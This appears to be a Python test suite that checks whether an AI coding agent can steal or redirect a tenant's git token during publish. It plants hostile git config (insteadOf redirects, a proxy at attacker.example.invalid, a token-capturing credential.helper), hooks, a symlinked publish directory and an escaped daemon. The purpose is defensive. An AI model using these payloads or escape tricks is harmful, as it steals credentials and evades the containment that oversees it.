"""The tenant token must reach only the forge of the task's repository_url.

The publish path authenticates git with the tenant's own token. That token can
be a classic PAT that reaches many repositories, so where it is allowed to go,
and which programs are allowed to touch it, is a tenant-isolation guarantee
(invariant 9), not a nicety.

The risk these tests pin is that the authenticated commands run in a repository
the agent just wrote to. A git repository honours its own ``.git/config``, and
the agent can write it: two settings there are enough to move the credential.

* ``url.<other-host>.insteadOf`` / ``pushInsteadOf`` rewrites the destination of
  a push -- including a URL passed explicitly on the command line -- so the
  authenticated push, and the credential git sends with it, goes to a host of
  the agent's choosing. No ``-c`` override disables ``insteadOf``: the only
  robust defence is to run the push in a repository whose config the worker,
  not the agent, wrote.
* ``credential.helper`` is a multi-valued setting, and the credential machinery
  invokes every configured helper -- so a helper the agent added is handed the
  credential (git calls it with ``store`` once the request succeeds) alongside
  the worker's own.

The property under test: no configuration the agent can write in the cloned
repository can send the token to a host other than the forge of the validated
``repository_url``, or hand it to a program other than the worker's own
credential mechanism.

Everything here runs against real git and local ``file://`` remotes, with only
the HTTP forge faked -- no network, no credential. `probe_repository` and
`open_pull_request` are the two functions replaced, exactly as in
`test_strategy_end_to_end.py`; the second remote (`attacker`) is the tell that a
push was redirected, since a branch only reaches it if the credential would have
too.
"""

from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

import pytest

from agent_worker import lifecycle, workspace as workspace_mod
from agent_worker import gitops
from agent_worker.forge import PullRequest, RepoAccess, RepoRef

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")


# -- real repositories, and two remotes: the intended one and an attacker's ---


def _git(cwd: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
        cwd=str(cwd),
        check=True,
        capture_output=True,
        text=True,
    )


def _bare_with_base(tmp_path: Path, name: str) -> Path:
    seed = tmp_path / f"seed-{name}"
    seed.mkdir()
    _git(seed, "init", "--quiet", "--initial-branch=main", ".")
    (seed / "README.md").write_text("base\n")
    _git(seed, "add", "-A")
    _git(seed, "commit", "--quiet", "-m", "base")
    bare = tmp_path / f"{name}.git"
    subprocess.run(
        ["git", "clone", "--quiet", "--bare", str(seed), str(bare)],
        check=True,
        capture_output=True,
    )
    return bare


def _empty_bare(tmp_path: Path, name: str) -> Path:
    bare = tmp_path / f"{name}.git"
    subprocess.run(["git", "init", "--quiet", "--bare", str(bare)], check=True, capture_output=True)
    return bare


@pytest.fixture
def origin(tmp_path: Path) -> Path:
    """The intended remote: a bare repository with one commit on ``main``."""
    return _bare_with_base(tmp_path, "origin")


@pytest.fixture
def attacker(tmp_path: Path) -> Path:
    """A second bare remote the token must never reach. Empty on purpose: if a
    branch turns up here, the authenticated push was redirected to it."""
    return _empty_bare(tmp_path, "attacker")


def refs(bare: Path) -> dict[str, str]:
    out = subprocess.run(
        ["git", "for-each-ref", "--format=%(refname:short) %(objectname)", "refs/heads/"],
        cwd=str(bare),
        check=True,
        capture_output=True,
        text=True,
    ).stdout.split()
    return dict(zip(out[0::2], out[1::2]))


def tree_at(bare: Path, ref: str) -> set[str]:
    listing = subprocess.run(
        ["git", "ls-tree", "-r", "--name-only", ref],
        cwd=str(bare),
        check=True,
        capture_output=True,
        text=True,
    ).stdout
    return {line for line in listing.splitlines() if line}


@pytest.fixture
def local_urls(monkeypatch, tmp_path: Path) -> None:
    """Let git reach any ``file://`` remote inside this test's tmp_path.

    `validate_repository_url` allows only https and ssh, which is correct and has
    its own tests; it is wrapped, not weakened -- any URL outside tmp_path still
    goes through the real validator.
    """
    real = gitops.validate_repository_url
    allowed = f"file://{tmp_path}"

    def validate(url: str) -> str:
        if url.startswith(allowed):
            return url
        return real(url)

    monkeypatch.setattr(gitops, "validate_repository_url", validate)


# -- the forge, faked at the HTTP boundary and nowhere else -----------------


class FakeForge:
    def __init__(self, *, can_push: bool = True, default_branch: str = "main") -> None:
        self.can_push = can_push
        self.default_branch = default_branch
        self.pulls: list[dict] = []

    def probe(self, *, url: str, token: str | None) -> RepoAccess:
        return RepoAccess(
            ref=RepoRef(host="github.com", owner="acme", name="widgets"),
            default_branch=self.default_branch,
            can_push=self.can_push,
            reason="the token has write permission on this repository",
        )

    def open_pull_request(self, **kwargs) -> PullRequest:
        self.pulls.append(kwargs)
        number = len(self.pulls)
        return PullRequest(
            number=number,
            url=f"https://github.com/acme/widgets/pull/{number}",
            state="open",
            created=True,
        )


@pytest.fixture
def forge(monkeypatch) -> FakeForge:
    fake = FakeForge()
    monkeypatch.setattr(lifecycle, "probe_repository", fake.probe)
    monkeypatch.setattr(lifecycle, "open_pull_request", fake.open_pull_request)
    return fake


# -- one whole attempt, with a hook to poison the clone before publishing ---


def run_attempt(
    worker_factory,
    monkeypatch,
    origin: Path,
    *,
    task_id: str,
    dispatch: dict,
    edit,
    poison=None,
    pre_publish=None,
    publish: bool = True,
):
    url = f"file://{origin}"
    worker, config, _ = worker_factory(
        task_id=task_id,
        attempt_id=f"att-{task_id}",
        lease_id=f"lease-{task_id}",
        repository_url=url,
    )
    worker.ws = workspace_mod.create(config.workspace_root, config.attempt_id)
    task = {"task_id": task_id, "metadata": {"dispatch": dispatch}}
    worker._task = task
    monkeypatch.setattr(worker, "_git_token", lambda: "not-a-real-token")

    cloned = worker._maybe_clone(task)
    assert cloned is not None and cloned["commit"], "the clone did not land"
    repo = worker.ws.work / lifecycle.REPO_DIR_NAME
    edit(repo)
    # The agent controls the repository it worked in, including its .git/config.
    if poison is not None:
        poison(repo)
    # The agent also shares a uid with `ws.private` (workspace.py: "not a
    # permission boundary"), so it can plant paths there during its run -- before
    # the worker's publish step ever looks. `pre_publish` models exactly that.
    if pre_publish is not None:
        pre_publish(worker)
    return worker, config, worker._harvest_git(publish=publish)


def agent_edits_without_committing(repo: Path) -> None:
    (repo / "agent.txt").write_text("work the agent never committed\n")
    (repo / "README.md").write_text("the repository as the agent left it\n")


def contributor_edit(name: str):
    def edit(repo: Path) -> None:
        (repo / f"{name}.txt").write_text(f"work from {name}\n")
    return edit


# -- redirect: the push must land only on the intended remote ---------------


def test_an_agent_written_insteadOf_cannot_redirect_the_authenticated_push(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge
):
    """`url.<attacker>.insteadOf <origin>` in the clone's own config rewrites the
    push URL -- so the branch, and the credential git would send with it, land
    on the attacker's remote instead of the forge. The push must ignore it."""
    attacker_url = f"file://{attacker}"
    origin_url = f"file://{origin}"

    def poison(repo: Path) -> None:
        _git(repo, "config", f"url.{attacker_url}.insteadOf", origin_url)

    _, config, _ = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-insteadof",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        poison=poison,
    )

    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch in refs(origin), "the authenticated push did not reach the intended remote"
    assert "agent.txt" in tree_at(origin, branch)
    assert branch not in refs(attacker), (
        "insteadOf in the clone's config redirected the authenticated push to another host"
    )


def test_an_agent_written_pushInsteadOf_cannot_redirect_the_authenticated_push(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge
):
    """`pushInsteadOf` rewrites push URLs specifically, so it survives any guard
    that only inspects the fetch/clone URL."""
    attacker_url = f"file://{attacker}"
    origin_url = f"file://{origin}"

    def poison(repo: Path) -> None:
        _git(repo, "config", f"url.{attacker_url}.pushInsteadOf", origin_url)

    _, config, _ = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-pushinsteadof",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        poison=poison,
    )

    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch in refs(origin), "the authenticated push did not reach the intended remote"
    assert branch not in refs(attacker), (
        "pushInsteadOf in the clone's config redirected the authenticated push"
    )


# -- redirect via a pre-planted publish directory ----------------------------
#
# The redirect tests above poison the CLONE's config. These poison the place the
# worker BUILDS its publish repository. The worker owns `ws.private`, but only by
# convention: it shares a uid with the agent (workspace.py calls `private/` "not
# a permission boundary"), and the publish repo used to sit at a name the agent
# could predict -- `$SWARM_WORKSPACE/private/publish`. So the agent could create
# a symlink there, during its run, pointing at a repository it had `git init`ed
# with a redirect. The worker's cleanup (`shutil.rmtree(..., ignore_errors=True)`
# then `mkdir(exist_ok=True)`) cannot delete a symlink and silently leaves it, so
# `git init` and the token-bearing push then run behind the link, inside the
# agent's repository, honouring its config. The publish repo must live at a name
# the agent could not have created ahead of time.


def _init_repo(path: Path) -> None:
    path.mkdir(parents=True, exist_ok=True)
    _git(path, "init", "--quiet", ".")


def _plant_publish_symlink(target: Path):
    """Return a `pre_publish` hook that points `ws.private/publish` at `target`.

    `"publish"` is spelled as a literal on purpose: it is the formerly-constant
    name whose predictability is the whole defect. On fixed code the worker never
    touches this name, so the planted link is simply left unused.
    """

    def hook(worker) -> None:
        link = worker.ws.private / "publish"
        if link.is_symlink() or link.exists():
            link.unlink()
        os.symlink(str(target), str(link), target_is_directory=True)

    return hook


def test_a_symlinked_publish_dir_cannot_redirect_the_authenticated_push(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge, tmp_path
):
    """The agent pre-plants a symlink at the publish path, pointing at a repo it
    prepared with `url.<attacker>.insteadOf`. The token-bearing push must still
    reach only the forge -- not the host the link's target redirects to."""
    attacker_url = f"file://{attacker}"
    origin_url = f"file://{origin}"

    planted = tmp_path / "agent-planted-publish"
    _init_repo(planted)
    _git(planted, "config", f"url.{attacker_url}.insteadOf", origin_url)

    _, config, out = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-symlinked-publish",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        pre_publish=_plant_publish_symlink(planted),
    )

    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch in refs(origin), (
        f"the authenticated push did not reach the intended remote: {out}"
    )
    assert "agent.txt" in tree_at(origin, branch)
    assert branch not in refs(attacker), (
        "a symlink the agent pre-planted at the publish directory redirected the "
        "authenticated push to another host"
    )


def test_the_token_bearing_push_runs_in_a_repo_free_of_agent_configuration(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge, tmp_path
):
    """Whatever the agent can write into a repository it reaches must not be the
    repository the token-bearing push authenticates from. This pins the whole
    class of redirect/interception keys at once -- `insteadOf`, `pushInsteadOf`,
    `http.proxy`, `http.sslVerify`, `remote.*.pushurl`, `credential.helper` --
    by inspecting the repository `push_branch` actually ran in and asserting it
    carries none of them, even when the agent pre-planted a symlink at the
    (formerly predictable) publish path pointing at a repo that carries all of
    them. `http.proxy` and `pushurl` cannot be exercised behaviourally over a
    `file://` remote (file transport ignores `http.*`, and the push names its URL
    explicitly rather than a remote whose `pushurl` could apply), so the property
    for those vectors is pinned here structurally."""
    attacker_url = f"file://{attacker}"
    origin_url = f"file://{origin}"

    planted = tmp_path / "agent-planted-full"
    _init_repo(planted)
    poison = {
        f"url.{attacker_url}.insteadOf": origin_url,
        f"url.{attacker_url}.pushInsteadOf": origin_url,
        "http.proxy": "http://attacker.example.invalid:3128",
        "http.sslVerify": "false",
        "http.extraHeader": "Authorization: Basic YXR0YWNrZXI6",
        "remote.origin.pushurl": attacker_url,
        "credential.helper": "!f() { cat >/dev/null; }; f",
    }
    for key, value in poison.items():
        _git(planted, "config", key, value)

    seen: dict[str, Path] = {}
    real_push = lifecycle.push_branch

    def recording_push(**kwargs):
        seen["repo"] = Path(kwargs["repo"])
        return real_push(**kwargs)

    monkeypatch.setattr(lifecycle, "push_branch", recording_push)

    run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-clean-publish-config",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        pre_publish=_plant_publish_symlink(planted),
    )

    assert "repo" in seen, "push_branch was never called; nothing was published"
    listed = subprocess.run(
        ["git", "-C", str(seen["repo"]), "config", "--local", "--list"],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.lower()
    for token in (
        "insteadof", "http.proxy", "sslverify", "extraheader", "pushurl", "credential.helper",
    ):
        assert token not in listed, (
            f"the repository the token-bearing push ran in carries the agent's "
            f"{token!r} (repo {seen['repo']}):\n{listed}"
        )


# -- the credential must never be handed to a program the agent chose --------


def _approve_credential(repo: Path, host: str, token: str, home: Path) -> None:
    """Do exactly what git does after a request authenticates: `credential
    approve`, which invokes `store` on every helper the repository configures.

    This is the mechanism by which a helper the agent added receives the token.
    Run against the repository the worker authenticates from, it shows whether
    an agent-written helper is in that repository's credential chain at all.
    """
    home.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        ["git", "-C", str(repo), "credential", "approve"],
        input=f"protocol=https\nhost={host}\nusername=x-access-token\npassword={token}\n\n",
        env={
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "HOME": str(home),
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_TERMINAL_PROMPT": "0",
        },
        capture_output=True,
        text=True,
    )


def _worker_publish_repos(private: Path) -> list[Path]:
    """Every git repository the worker built under its own private scratch."""
    return sorted({p.parent for p in private.rglob(".git") if p.is_dir()})


def test_an_agent_credential_helper_never_sees_the_token_from_the_publish_repo(
    worker_factory, monkeypatch, origin, local_urls, forge, tmp_path
):
    """A `credential.helper` the agent writes into the clone's config is handed
    the token on a successful authenticated request. So the authenticated push
    must run in a repository the worker owns, whose config carries no helper the
    agent wrote -- never in the clone itself.
    """
    marker = tmp_path / "agent-helper-received.txt"
    clean_home = tmp_path / "approve-home"

    def poison(repo: Path) -> None:
        # A helper that records whatever it is handed on `store` -- i.e. the token.
        helper = f"!f() {{ if [ \"$1\" = store ]; then cat >> '{marker}'; fi; }}; f"
        _git(repo, "config", "credential.helper", helper)

    worker, _, _ = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-credhelper",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        poison=poison,
    )

    agent_repo = worker.ws.work / lifecycle.REPO_DIR_NAME

    # Control: the marker mechanism works, and the CLONE is genuinely vulnerable.
    # Approving a credential in the clone hands the agent's helper the token.
    _approve_credential(agent_repo, "github.com", "SENTINEL-CONTROL", clean_home)
    assert marker.exists() and "SENTINEL-CONTROL" in marker.read_text(), (
        "the control failed: approving in the clone did not reach the agent helper, "
        "so this test could not detect a leak either"
    )
    marker.unlink()

    # Property: the worker authenticated from a repository it owns, and that
    # repository does not carry the agent's helper -- so the same approve there
    # hands the agent nothing.
    publish_repos = _worker_publish_repos(worker.ws.private)
    assert publish_repos, (
        "the worker did not isolate the authenticated push into a repository it "
        "owns; it ran in the clone, whose config the agent controls"
    )
    for repo in publish_repos:
        _approve_credential(repo, "github.com", "SENTINEL-TOKEN", clean_home)
    assert not marker.exists() or marker.read_text() == "", (
        "an agent-written credential.helper received the token from the repository "
        "the worker authenticates from"
    )


# -- the isolation must not break the two things publish exists to do --------


def test_the_push_still_reaches_the_intended_remote_with_the_agents_changes(
    worker_factory, monkeypatch, origin, local_urls, forge
):
    """The positive control for the whole path: with no poisoned config, the
    branch lands on the forge and carries the agent's edits."""
    _, config, out = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-clean-push",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
    )

    branch = f"{config.git_branch_prefix}{config.task_id}"
    landed = refs(origin)
    assert branch in landed and landed[branch] != landed["main"], out
    assert "agent.txt" in tree_at(origin, branch)
    assert out["published"] is True
    assert out["auto_committed"] is True
    assert len(forge.pulls) == 1


def test_integrate_merges_contributor_branches_and_opens_one_pull_request(
    worker_factory, monkeypatch, origin, local_urls, forge
):
    """The integrator fetches contributor branches from the remote (with the
    token) and merges them -- work that also has to happen in worker-owned state
    now, not in the clone. One pull request, whose branch carries every file."""
    for name in ("t-a", "t-b"):
        run_attempt(
            worker_factory, monkeypatch, origin,
            task_id=name,
            dispatch={"strategy": "integrate", "role": "contributor"},
            edit=contributor_edit(name),
        )
    assert forge.pulls == []

    _, config, out = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-int",
        dispatch={
            "strategy": "integrate",
            "role": "integrator",
            "integrates": ["t-a", "t-b"],
        },
        edit=contributor_edit("t-int"),
    )

    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch in refs(origin), out
    landed = tree_at(origin, branch)
    assert {"t-a.txt", "t-b.txt", "t-int.txt"} <= landed, (
        f"the single pull request does not contain the whole workflow: {sorted(landed)}"
    )
    assert out["integrated"]["merged"] == ["swarm/t-a", "swarm/t-b"]
    assert out["integrated"]["complete"] is True
    assert len(forge.pulls) == 1


def test_a_repository_hook_is_never_run_during_publish(
    worker_factory, monkeypatch, origin, local_urls, forge, tmp_path
):
    """The agent can write `.git/hooks/*` in the clone. Nothing on the publish
    path -- the commit of uncommitted work, the transfer, the push -- may run
    one, before or after the isolation."""
    marker = tmp_path / "hook-ran.txt"

    def poison(repo: Path) -> None:
        hooks = repo / ".git" / "hooks"
        hooks.mkdir(parents=True, exist_ok=True)
        for name in ("pre-commit", "pre-push", "post-checkout", "post-commit"):
            hook = hooks / name
            hook.write_text(f"#!/bin/sh\ntouch '{marker}'\n")
            hook.chmod(0o755)

    run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-hooks",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        poison=poison,
    )

    assert not marker.exists(), "a repository-supplied hook executed during publish"


# ---------------------------------------------------------------------------
# The reap: no process the agent started is alive when the token is used
# ---------------------------------------------------------------------------
#
# The tests above prove WHERE the token-bearing commands run (a worker-owned
# repository whose config the agent never wrote). These prove WHEN: before the
# first token-bearing step, every process the agent double-forked out of the
# runner's session is killed and its death verified. Such a process shares the
# worker's uid and, left alive, could watch `ws.private` and poison the publish
# repository between its creation and the push, or read the 0600 credential file
# while the push runs -- neither of which the worker-owned repository alone
# prevents, because the attacker does not need to write the repo's config from
# inside, only to be a live process next to it.
#
# The real reap runs `os.kill(-1, SIGKILL)`, which in this shared test process
# would kill the test runner; `procman`'s own tests exercise it inside a private
# PID namespace. Here the reap is injected with a SCOPED stand-in that kills the
# one escaped daemon by its process group and verifies it is gone -- so what is
# under test is the worker's ordering (reap, verified, BEFORE the credential is in
# hand) and its refusal path, against real git and a real escaped process.

_DAEMON_HELPER = Path(__file__).with_name("forge_escaped_daemon.py")


def _pid_alive(pid: int) -> bool:
    """True while `pid` names a live (non-zombie) process."""
    try:
        with open(f"/proc/{pid}/status", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                if line.startswith("State:"):
                    return not line.split(None, 2)[1].startswith("Z")
        return True
    except FileNotFoundError:
        return False
    except OSError:
        # No /proc (e.g. macOS locally): fall back to signal 0. CI is Linux.
        try:
            os.kill(pid, 0)
            return True
        except ProcessLookupError:
            return False
        except OSError:
            return True


def _spawn_escaped_daemon(worker, origin: Path, attacker: Path, tmp_path: Path) -> int:
    """Start a real double-forked setsid daemon watching `ws.private`. Returns its
    pid (== its process-group id, after setsid)."""
    pidfile = tmp_path / "daemon.pid"
    lootfile = tmp_path / "daemon.loot"
    # DEVNULL, not capture_output: the launched process double-forks a daemon
    # that would inherit a capture pipe and hold it open for its whole life,
    # blocking this call. The launcher itself exits as soon as it has forked.
    subprocess.run(
        [
            sys.executable, str(_DAEMON_HELPER),
            str(worker.ws.private), str(pidfile), str(lootfile),
            f"file://{origin}", f"file://{attacker}",
        ],
        check=True,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=15,
    )
    for _ in range(500):
        if pidfile.exists() and pidfile.read_text().strip():
            break
        time.sleep(0.01)
    else:
        raise AssertionError("the escaped daemon never wrote its pid")
    return int(pidfile.read_text().strip())


def _kill_group(pid: int) -> None:
    try:
        os.killpg(pid, signal.SIGKILL)
    except (ProcessLookupError, OSError):
        pass


@pytest.mark.skipif(
    not Path("/proc").is_dir(),
    reason="the reap verifies liveness via /proc; this platform has none (CI is Linux)",
)
def test_no_agent_process_is_alive_when_the_publish_token_is_used(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge, tmp_path
):
    """A process the agent double-forked into its own session survives the
    runner's group kill. Before the worker's publish path uses the tenant token,
    that process must be dead. Injected scoped reaper; real daemon; real git."""
    state = {"reaper_called": False, "daemon_pid": None, "alive_at_prepare": None,
             "alive_at_push": None}

    def scoped_reaper() -> tuple:
        state["reaper_called"] = True
        pid = state["daemon_pid"]
        _kill_group(pid)
        for _ in range(200):
            if not _pid_alive(pid):
                return ()
            time.sleep(0.02)
            _kill_group(pid)
        return (pid,)

    def set_up(worker) -> None:
        state["daemon_pid"] = _spawn_escaped_daemon(worker, origin, attacker, tmp_path)
        worker.reap_before_publish = scoped_reaper

    # Record whether the daemon is alive at the two token-bearing steps.
    real_prepare = lifecycle.prepare_publish_repo
    real_push = lifecycle.push_branch

    def watch_prepare(**kwargs):
        state["alive_at_prepare"] = _pid_alive(state["daemon_pid"])
        return real_prepare(**kwargs)

    def watch_push(**kwargs):
        state["alive_at_push"] = _pid_alive(state["daemon_pid"])
        return real_push(**kwargs)

    monkeypatch.setattr(lifecycle, "prepare_publish_repo", watch_prepare)
    monkeypatch.setattr(lifecycle, "push_branch", watch_push)

    try:
        _, config, out = run_attempt(
            worker_factory, monkeypatch, origin,
            task_id="t-reap",
            dispatch={"strategy": "direct-pr"},
            edit=agent_edits_without_committing,
            pre_publish=set_up,
        )

        assert state["reaper_called"] is True, (
            "the publish path never reaped: agent processes could be alive while the "
            "token is used"
        )
        assert state["alive_at_prepare"] is False, (
            "an agent process was alive when the worker built the publish repository "
            "-- the window it could poison it before the push"
        )
        assert state["alive_at_push"] is False, (
            "an agent process was alive when the token-bearing push ran -- it could "
            "read the credential file while the push held it"
        )
        # The isolation still holds and the loot stays empty.
        branch = f"{config.git_branch_prefix}{config.task_id}"
        assert branch in refs(origin), out
        assert branch not in refs(attacker)
        loot = tmp_path / "daemon.loot"
        assert not loot.exists() or loot.read_text() == "", (
            "the escaped daemon captured credential material during publish"
        )
    finally:
        if state["daemon_pid"] is not None:
            _kill_group(state["daemon_pid"])


def test_publish_is_refused_when_agent_processes_survive_the_reap(
    worker_factory, monkeypatch, origin, attacker, local_urls, forge, tmp_path
):
    """If the reap cannot prove the container clean, the publish is refused with a
    stated reason -- and no token-bearing command runs at all."""
    ran = {"prepare": False, "push": False}
    real_prepare = lifecycle.prepare_publish_repo
    real_push = lifecycle.push_branch

    def guard_prepare(**kwargs):
        # Delegates rather than short-circuits so that on code that does NOT reap
        # (the pre-fix state this is red against) the publish runs to completion
        # and `ran["prepare"]` catches it -- a clean assertion, not a crash.
        ran["prepare"] = True
        return real_prepare(**kwargs)

    def guard_push(**kwargs):
        ran["push"] = True
        return real_push(**kwargs)

    monkeypatch.setattr(lifecycle, "prepare_publish_repo", guard_prepare)
    monkeypatch.setattr(lifecycle, "push_branch", guard_push)

    def set_reaper(worker) -> None:
        worker.reap_before_publish = lambda: (4242, 4243)

    _, config, out = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-reap-refused",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        pre_publish=set_reaper,
    )

    assert out["published"] is False
    assert "still alive" in out["publish_reason"], out
    assert ran["prepare"] is False, "the publish repository was built despite survivors"
    assert ran["push"] is False, "the token-bearing push ran despite survivors"
    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch not in refs(origin), "a branch was pushed despite the reap refusing"


def test_a_clean_publish_reaps_first_and_still_succeeds(
    worker_factory, monkeypatch, origin, local_urls, forge, tmp_path
):
    """The control: the reap runs on the normal path too, and when it finds
    nothing the publish proceeds exactly as before."""
    called = {"reaped": False}

    def clean_reaper() -> tuple:
        called["reaped"] = True
        return ()

    def set_reaper(worker) -> None:
        worker.reap_before_publish = clean_reaper

    _, config, out = run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-reap-clean",
        dispatch={"strategy": "direct-pr"},
        edit=agent_edits_without_committing,
        pre_publish=set_reaper,
    )

    assert called["reaped"] is True, "the reap did not run on the clean publish path"
    branch = f"{config.git_branch_prefix}{config.task_id}"
    assert branch in refs(origin), out
    assert out["published"] is True


# -- the integrator's fetch must not recurse into submodules ------------------


def test_the_integrator_fetch_does_not_recurse_into_submodules(
    worker_factory, monkeypatch, origin, local_urls, forge
):
    """`fetch.recurseSubmodules` defaults to on-demand, which would fetch a
    submodule named in an untrusted contributor branch's `.gitmodules` -- carrying
    the token to whatever host it lists. The token-bearing fetch must disable it."""
    for name in ("t-sa", "t-sb"):
        run_attempt(
            worker_factory, monkeypatch, origin,
            task_id=name,
            dispatch={"strategy": "integrate", "role": "contributor"},
            edit=contributor_edit(name),
        )

    recorded: list[list[str]] = []
    real_run_child = gitops.run_child

    def recording(argv, **kwargs):
        recorded.append(list(argv))
        return real_run_child(argv, **kwargs)

    monkeypatch.setattr(gitops, "run_child", recording)

    run_attempt(
        worker_factory, monkeypatch, origin,
        task_id="t-sint",
        dispatch={
            "strategy": "integrate",
            "role": "integrator",
            "integrates": ["t-sa", "t-sb"],
        },
        edit=contributor_edit("t-sint"),
    )

    fetches = [a for a in recorded if "fetch" in a]
    assert fetches, "the integrator ran no fetch; the test proves nothing"
    for argv in fetches:
        assert "fetch.recurseSubmodules=false" in argv, (
            f"the token-bearing fetch would recurse into submodules: {argv}"
        )
        assert "submodule.recurse=false" in argv, argv
